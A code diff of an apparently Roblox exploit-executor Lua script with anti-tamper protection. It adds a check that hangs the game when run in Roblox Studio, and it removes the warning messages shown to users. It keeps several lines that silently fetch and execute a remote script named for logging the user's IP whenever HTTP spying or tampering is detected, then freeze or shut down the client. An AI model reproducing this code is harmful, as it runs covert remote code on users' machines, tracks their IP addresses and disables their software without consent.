@@ -1,3 +1,7 @@
+if identifyexecutor() and identifyexecutor() == "RobloxStudio.exe" then
+	while true do end
+	game:Shutdown()
+end
 
 if not HttpsProtect then
 	HttpsProtect = {
@@ -32,7 +36,6 @@ for _, func in next, functions do
                     for _, url in ipairs(OrginalHttps) do
                         if tostring(arg):find(url) then
 	                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
-							setclipboard("You have been warned for trying to crack our script, If you don't do that and still got this warning, please contact to us to fix the problem")
 	                        while true do end
                             return 
                         end
@@ -55,7 +58,6 @@ for _, func in next, functions do
                     for _, url in ipairs(HttpsProtect) do
                         if tostring(arg):find(url) then
 	                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
-							setclipboard("You have been warned for trying to crack our script, If you don't do that and still got this warning, please contact to us to fix the problem")
 	                        while true do end
                             return 
                         end
@@ -77,7 +79,6 @@ setmetatable(
         __newindex = function(t, i, v)
             if tostring(i) == "ID" then
 	            loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
-				setclipboard("You have been warned for trying to crack our script, If you don't do that and still got this warning, please contact to us to fix the problem")
 				game:Shutdown()
                 while true do end return 
             end
@@ -95,7 +96,6 @@ local function checkDescendant(descendant)
 	            if string.find(descendant.Text, name) or descendant.Name == name then
 					descendant:Destroy()
 					loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
-					setclipboard("You have been warned for trying to crack our script, If you don't do that and still got this warning, please contact to us to fix the problem")
 					game:Shutdown()
 	                while true do end return 
 	            end
@@ -106,7 +106,6 @@ local function checkDescendant(descendant)
 	            if string.find(descendant.Text, name) or descendant.Name == name then
 					descendant:Destroy()
 					loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
-					setclipboard("You have been warned for trying to crack our script, If you don't do that and still got this warning, please contact to us to fix the problem")
 					game:Shutdown()
 	                while true do end return 
 	            end
@@ -134,7 +133,6 @@ spawn(function()
 		if HttpSpy then
 			HttpSpy:Destroy()
 			loadstring(game:HttpGet('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua', true))()
-			setclipboard("You have been warned for trying to crack our script, If you don't do that and still got this warning, please contact to us to fix the problem")
 			game:Shutdown()
 		end
 	end
